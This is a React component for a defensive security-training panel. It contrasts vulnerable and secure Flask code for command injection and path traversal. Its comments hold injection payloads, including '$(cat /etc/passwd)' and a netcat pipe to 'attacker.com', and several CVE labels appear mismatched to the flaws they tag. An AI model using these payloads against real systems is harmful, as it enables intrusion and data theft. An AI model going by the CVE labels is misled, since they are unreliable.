import React, { useState } from 'react'

const DEFENSES = [
  {
    id: 1,
    title: 'Ping Endpoint',
    vuln_type: 'OS Command Injection — No Filter',
    cve: 'CVE-2021-41773',
    vulnerable: `# VULNERABLE CODE
import subprocess
from flask import request

@app.route('/ping', methods=['POST'])
def ping():
    host = request.json.get('host')
    
    # ❌ VULNERABLE: Direct shell execution
    # Attacker input: "127.0.0.1; whoami"
    # Executes: ping -n 2 127.0.0.1 AND whoami
    output = subprocess.check_output(
        f"ping -n 2 {host}",
        shell=True          # ❌ shell=True is dangerous
    )
    return output`,
    secure: `# SECURE CODE
import subprocess
import re
from flask import request

@app.route('/ping/safe', methods=['POST'])
def ping_safe():
    host = request.json.get('host', '')
    
    # ✅ FIX 1: Whitelist validation
    ip_pattern = r'^(\\d{1,3}\\.){3}\\d{1,3}$'
    if not re.match(ip_pattern, host):
        return {'error': 'Invalid IP address'}, 400
    
    # ✅ FIX 2: No shell=True — args as list
    output = subprocess.check_output(
        ['ping', '-n', '2', host],  # ✅ List args
        shell=False                  # ✅ No shell
    )
    return output`,
    fixes: [
      'Input validation with whitelist regex',
      'subprocess list args instead of string',
      'shell=False prevents shell interpretation',
      'No user input reaches the shell directly'
    ]
  },
  {
    id: 2,
    title: 'DNS Lookup Endpoint',
    vuln_type: 'Blacklist Filter Bypass',
    cve: 'CVE-2019-11510',
    vulnerable: `# VULNERABLE CODE
import subprocess

@app.route('/nslookup', methods=['POST'])
def dns_lookup():
    domain = request.json.get('domain')
    
    # ❌ WEAK: Blacklist only blocks semicolons
    # Bypass: use && or || or newline %0a
    BLACKLIST = [';']
    for char in BLACKLIST:
        if char in domain:
            return {'error': 'Blocked'}, 400
    
    # ❌ Still vulnerable to && bypass
    # Attacker: "google.com && whoami"
    output = subprocess.check_output(
        f"nslookup {domain}", shell=True
    )
    return output`,
    secure: `# SECURE CODE
import subprocess
import re

@app.route('/nslookup/safe', methods=['POST'])
def dns_lookup_safe():
    domain = request.json.get('domain', '')
    
    # ✅ FIX 1: Strict domain whitelist
    domain_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9\\-\\.]{0,253}$'
    if not re.match(domain_pattern, domain):
        return {'error': 'Invalid domain'}, 400
    
    # ✅ FIX 2: Block all special chars
    FORBIDDEN = [';','&&','||','|','$','\`',
                 '\\n','%0a','<','>','*','?']
    for char in FORBIDDEN:
        if char in domain:
            return {'error': 'Invalid input'}, 400
    
    # ✅ FIX 3: List args, no shell
    output = subprocess.check_output(
        ['nslookup', domain], shell=False
    )
    return output`,
    fixes: [
      'Strict regex whitelist for domain names',
      'Comprehensive blacklist for all operators',
      'subprocess list args — no shell interpretation',
      'Input length validation'
    ]
  },
  {
    id: 3,
    title: 'File Reader Endpoint',
    vuln_type: 'Path Traversal + Command Injection',
    cve: 'CVE-2021-41773',
    vulnerable: `# VULNERABLE CODE
import os

@app.route('/readfile', methods=['POST'])
def read_file():
    filename = request.json.get('filename')
    
    # ❌ VULNERABLE: Only blocks /etc prefix
    # Bypass: use ../../etc/passwd
    # Or inject: file.txt; whoami
    if filename.startswith('/etc'):
        return {'error': 'Blocked'}, 400
    
    # ❌ Direct shell execution with user input
    output = os.popen(
        f"cat /logs/{filename}"
    ).read()
    return {'output': output}`,
    secure: `# SECURE CODE
import os
import re

SAFE_DIR = '/app/logs'

@app.route('/readfile/safe', methods=['POST'])
def read_file_safe():
    filename = request.json.get('filename', '')
    
    # ✅ FIX 1: Filename whitelist
    if not re.match(r'^[a-zA-Z0-9_\\-\\.]+$', filename):
        return {'error': 'Invalid filename'}, 400
    
    # ✅ FIX 2: Resolve and check path
    safe_path = os.path.realpath(
        os.path.join(SAFE_DIR, filename)
    )
    
    # ✅ FIX 3: Prevent path traversal
    if not safe_path.startswith(SAFE_DIR):
        return {'error': 'Path traversal blocked'}, 400
    
    # ✅ FIX 4: Read directly — no shell
    with open(safe_path) as f:
        return {'output': f.read()}`,
    fixes: [
      'Filename whitelist — alphanumeric only',
      'Path canonicalization with os.path.realpath',
      'Directory jail — blocks path traversal',
      'Direct file read — no shell involved'
    ]
  },
  {
    id: 4,
    title: 'shlex.quote() Defense',
    vuln_type: 'Universal Shell Escaping',
    cve: 'General Best Practice',
    vulnerable: `# VULNERABLE CODE — No escaping
import subprocess

def run_command(user_input):
    # ❌ Raw user input in shell string
    # Any shell metachar will execute
    cmd = f"process {user_input}"
    return subprocess.check_output(
        cmd, shell=True
    )

# Attack examples:
# user_input = "; whoami"
# user_input = "$(cat /etc/passwd)"
# user_input = "\`id\`"
# user_input = "| nc attacker.com 4444"`,
    secure: `# SECURE CODE — shlex.quote()
import subprocess
import shlex

def run_command_safe(user_input):
    # ✅ FIX: shlex.quote escapes ALL
    # shell metacharacters automatically
    safe_input = shlex.quote(user_input)
    
    # Even with shell=True, input is safe
    cmd = f"process {safe_input}"
    return subprocess.check_output(
        cmd, shell=True
    )

# After shlex.quote():
# "; whoami"     → "'; whoami'"
# "$(id)"        → "'$(id)'"
# "\`whoami\`"   → "'\`whoami\`'"
# All treated as literal strings ✅`,
    fixes: [
      'shlex.quote() escapes all shell metacharacters',
      'Works even when shell=True is required',
      'Automatic — no manual blacklist needed',
      'Industry standard Python defense'
    ]
  }
]

export default function DefensePanel() {
  const [selected, setSelected] = useState(0)
  const [view,     setView]     = useState<'both'|'vuln'|'safe'>('both')

  const defense = DEFENSES[selected]

  return (
    <div style={{ color: '#e2e8f0' }}>

      {/* Header */}
      <div style={{ marginBottom: '24px' }}>
        <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: '#fff' }}>
          🛡️ Defense Panel
        </h2>
        <p style={{ color: '#6b7280', fontSize: '13px', marginTop: '4px' }}>
          Side-by-side vulnerable vs secure code comparison
        </p>
      </div>

      {/* Selector tabs */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '16px',
                    flexWrap: 'wrap' }}>
        {DEFENSES.map((d, i) => (
          <button
            key={d.id}
            onClick={() => setSelected(i)}
            style={{
              padding: '8px 16px',
              borderRadius: '6px',
              border: '1px solid',
              borderColor: selected === i ? '#7c3aed' : '#1f2937',
              backgroundColor: selected === i ? '#7c3aed' : '#16213e',
              color: selected === i ? '#fff' : '#9ca3af',
              cursor: 'pointer',
              fontSize: '13px',
              fontWeight: selected === i ? '600' : '400'
            }}
          >
            {d.title}
          </button>
        ))}
      </div>

      {/* CVE + Vuln info bar */}
      <div style={{
        backgroundColor: '#16213e',
        border: '1px solid #1f2937',
        borderRadius: '8px',
        padding: '12px 16px',
        marginBottom: '16px',
        display: 'flex',
        gap: '24px',
        alignItems: 'center'
      }}>
        <div>
          <span style={{ color: '#6b7280', fontSize: '11px' }}>CVE Reference</span>
          <div style={{ color: '#f87171', fontWeight: '600', fontSize: '13px' }}>
            {defense.cve}
          </div>
        </div>
        <div>
          <span style={{ color: '#6b7280', fontSize: '11px' }}>Vulnerability Type</span>
          <div style={{ color: '#fbbf24', fontSize: '13px' }}>
            {defense.vuln_type}
          </div>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          {(['both','vuln','safe'] as const).map(v => (
            <button
              key={v}
              onClick={() => setView(v)}
              style={{
                padding: '4px 12px',
                borderRadius: '4px',
                border: '1px solid #374151',
                backgroundColor: view === v ? '#374151' : 'transparent',
                color: view === v ? '#fff' : '#6b7280',
                cursor: 'pointer',
                fontSize: '12px'
              }}
            >
              {v === 'both' ? 'Both' : v === 'vuln' ? '❌ Vulnerable' : '✅ Secure'}
            </button>
          ))}
        </div>
      </div>

      {/* Code comparison */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: view === 'both' ? '1fr 1fr' : '1fr',
        gap: '16px',
        marginBottom: '16px'
      }}>

        {/* Vulnerable code */}
        {(view === 'both' || view === 'vuln') && (
          <div style={{
            backgroundColor: '#1a0a0a',
            border: '1px solid #7f1d1d',
            borderRadius: '8px',
            overflow: 'hidden'
          }}>
            <div style={{
              backgroundColor: '#7f1d1d',
              padding: '8px 16px',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              <span>❌</span>
              <span style={{ color: '#fca5a5', fontWeight: '600',
                             fontSize: '13px' }}>
                Vulnerable Code
              </span>
            </div>
            <pre style={{
              padding: '16px',
              color: '#fca5a5',
              fontFamily: 'monospace',
              fontSize: '12px',
              lineHeight: '1.6',
              overflow: 'auto',
              margin: 0,
              whiteSpace: 'pre-wrap'
            }}>
              {defense.vulnerable}
            </pre>
          </div>
        )}

        {/* Secure code */}
        {(view === 'both' || view === 'safe') && (
          <div style={{
            backgroundColor: '#0a1a0e',
            border: '1px solid #14532d',
            borderRadius: '8px',
            overflow: 'hidden'
          }}>
            <div style={{
              backgroundColor: '#14532d',
              padding: '8px 16px',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              <span>✅</span>
              <span style={{ color: '#86efac', fontWeight: '600',
                             fontSize: '13px' }}>
                Secure Code
              </span>
            </div>
            <pre style={{
              padding: '16px',
              color: '#86efac',
              fontFamily: 'monospace',
              fontSize: '12px',
              lineHeight: '1.6',
              overflow: 'auto',
              margin: 0,
              whiteSpace: 'pre-wrap'
            }}>
              {defense.secure}
            </pre>
          </div>
        )}
      </div>

      {/* Fixes list */}
      <div style={{
        backgroundColor: '#16213e',
        border: '1px solid #1f2937',
        borderRadius: '8px',
        padding: '16px'
      }}>
        <h3 style={{ color: '#d1d5db', fontSize: '13px',
                     marginBottom: '12px', textTransform: 'uppercase',
                     letterSpacing: '0.05em' }}>
          ✅ Security Fixes Applied
        </h3>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr',
                      gap: '8px' }}>
          {defense.fixes.map((fix, i) => (
            <div key={i} style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              backgroundColor: '#0a1a0e',
              border: '1px solid #14532d',
              borderRadius: '6px',
              padding: '8px 12px'
            }}>
              <span style={{ color: '#4ade80', fontSize: '16px' }}>✓</span>
              <span style={{ color: '#86efac', fontSize: '13px' }}>{fix}</span>
            </div>
          ))}
        </div>
      </div>

    </div>
  )
}